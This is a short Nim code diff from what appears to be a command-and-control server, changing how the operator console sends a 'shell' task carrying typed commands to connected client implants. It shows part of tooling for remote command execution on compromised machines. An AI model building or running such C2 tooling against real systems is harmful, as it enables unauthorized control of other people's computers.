@@ -38,7 +38,7 @@ proc procStdin*(server: C2Server) {.async.} =
           c2cli.mode = ClientInteractMode
         else:
           for client in c2cli.handlingClient:
-            let task = await client.sendClientTask("shell", %*[ args.join(" ") ])
+            let task = await client.sendClientTask("shell", @[ args.join(" ") ])
             if not task.isNil(): 
               c2cli.waitingForOutput = true
       else:
